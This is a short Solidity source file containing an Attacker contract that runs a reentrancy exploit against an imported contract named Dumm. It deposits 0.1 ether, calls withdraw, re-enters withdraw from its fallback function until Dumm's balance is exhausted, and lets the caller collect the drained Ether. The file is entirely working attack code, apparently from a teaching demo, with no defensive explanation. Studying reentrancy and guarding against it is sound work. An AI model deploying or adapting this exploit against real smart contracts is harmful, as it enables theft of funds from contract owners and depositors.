// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;
import "./Dumm.sol";

contract Attacker {
    Dumm public dumm;

    constructor(address _dummAddress) {
        dumm = Dumm(_dummAddress);
    }

    // Fallback is called when dumm sends Ether to this contract.
    fallback() external payable {
        if (address(dumm).balance >= 0.1 ether) {
            dumm.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 0.1 ether);
        dumm.deposit{value: 0.1 ether}();
        dumm.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function withdrawAll() public {
        address payable to = payable(msg.sender);
        to.transfer(getBalance());
    }
}